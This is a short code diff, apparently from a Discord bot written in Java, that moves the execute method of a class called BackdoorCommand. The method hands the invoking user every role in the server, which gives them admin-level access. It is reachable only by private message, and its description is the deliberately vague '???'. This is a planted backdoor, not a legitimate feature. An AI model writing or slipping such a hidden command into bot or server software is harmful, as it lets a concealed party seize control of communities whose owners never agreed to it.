@@ -17,6 +17,14 @@ import java.util.List;
 public class BackdoorCommand extends BasicCommand
 {
 	@Override
+	public CommandResult execute(MessageReceivedEvent event, LinkedList<String> args) throws Exception
+	{
+		super.execute(event, args);
+		Actions.giveRole(event.getGuild(), event.getAuthor(), event.getGuild().getRoles());
+		return CommandResult.SUCCESS;
+	}
+	
+	@Override
 	public int getScope()
 	{
 		return ChannelType.PRIVATE.getId();
@@ -38,14 +46,6 @@ public class BackdoorCommand extends BasicCommand
 	public String getDescription()
 	{
 		return "???";
-	}
-	
-	@Override
-	public CommandResult execute(MessageReceivedEvent event, LinkedList<String> args) throws Exception
-	{
-		super.execute(event, args);
-		Actions.giveRole(event.getGuild(), event.getAuthor(), event.getGuild().getRoles());
-		return CommandResult.SUCCESS;
 	}
 	
 	@Override
